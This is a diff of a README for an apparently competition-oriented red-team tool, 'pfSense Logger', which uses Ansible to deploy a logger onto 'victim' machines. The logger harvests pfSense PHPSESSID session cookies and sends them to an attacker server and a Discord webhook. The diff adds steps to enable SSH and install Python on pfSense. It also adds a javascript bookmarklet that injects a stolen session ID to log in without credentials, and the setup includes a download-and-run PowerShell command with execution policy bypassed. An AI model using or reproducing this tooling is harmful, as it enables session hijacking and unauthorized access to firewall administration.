@@ -17,13 +17,15 @@ These IPs will be changed for each comp, and hopefully I will update the README 
 
 ## Installation
 
-### Step 1: Pre-Ansible Setup (Unneeded if Ansible is already usable)
+### Step 1 (Unneeded if Ansible is already usable): Pre-Ansible Setup
 Run these 2 commands in an **Administrator Powershell** on the target machines
 
 ***(New-Object -TypeName System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ansible/ansible-documentation/devel/examples/scripts/ConfigureRemotingForAnsible.ps1", "$env:temp\ConfigureRemotingForAnsible.ps1")***
 
 ***powershell.exe -ExecutionPolicy ByPass -File "$env:temp\ConfigureRemotingForAnsible.ps1"***
 
+### Step 1.5 (Unneeded if Ansible is already usable): Pre-Ansible Setup for pfSense
+Log into the pfSense WebGUI, navigate to System > Advanced > Admin Access, check the box for Enable Secure Shell, and click Save at the bottom. Ansible also needs Python to run tasks, so go to Diagnostics > Command Prompt. In the Execute Shell Command box, enter ***pkg install -y python3*** and click Execute.
 
 ### Step 2: Certificate Generation
 You must generate new cert.pem and key.pem files as my key.pem file is not included in this repository (I'm not that stupid).
@@ -42,5 +44,10 @@ You must edit hosts.ini to the IPs of the targets you wish to edit. These target
 
 ***ansible-playbook -i hosts.ini deploy.yml***
 
+### Step 5 (Optional): Setup Bookmark on Any Computer You Want
+Now, with everything on the victim side setup, you can optionally setup a bookmark on any computer, on any browser, to easily insert these PHPSESSID cookies into the login screen of pfSense and be logged in without knowing credentials. Go to your bookmark bar as if you're putting in any normal website bookmark, and paste this into the URL field.
+
+***javascript:(function(){let id=prompt("Enter PHPSESSID:");if(id){document.cookie="PHPSESSID="+id+"; path=/";window.location.href="/";}else{alert("No session ID entered.");}})();***
+
 ## Usage
-Any time the pfSense web GUI is visited or logged into, it will log a PHPSESSID into the Firefox cookies. pfSense Logger will grab this cookie and also send it back to the server, where the server will store it into a sqlite .db file. It is also configured to send it into a discord channel through a webhook.
+Any time the pfSense web GUI is visited or logged into, it will log a PHPSESSID into the cookies. pfSense Logger will grab this cookie and also send it back to the server, where the server will store it into a sqlite .db file. It is also configured to send it into a discord channel through a webhook.
